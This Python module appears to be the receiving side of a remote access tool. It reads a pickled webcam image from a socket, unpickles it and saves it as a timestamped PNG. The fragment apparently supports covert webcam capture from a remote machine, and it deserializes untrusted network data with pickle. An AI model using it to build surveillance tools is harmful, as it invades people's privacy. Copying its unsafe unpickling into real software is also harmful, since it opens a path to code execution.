import cv2
import os
import pickle
import library.modules.recv_all as recv_all
from datetime import datetime
import library.modules.config as config


config.main()


def main(sock):
    print(config.inf + 'Waiting for raw webcam pickle to arrive')
    raw_bytes = recv_all.main(sock)
    file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
    if type(raw_bytes) is str:
        print(raw_bytes)
    elif type(raw_bytes) is bytes:
        img = pickle.loads(raw_bytes)
        img.save(file_name, 'PNG')
        print(config.pos + 'Wrote file to : ' + os.path.join(os.getcwd(), file_name))
        print(config.pos + 'Done')
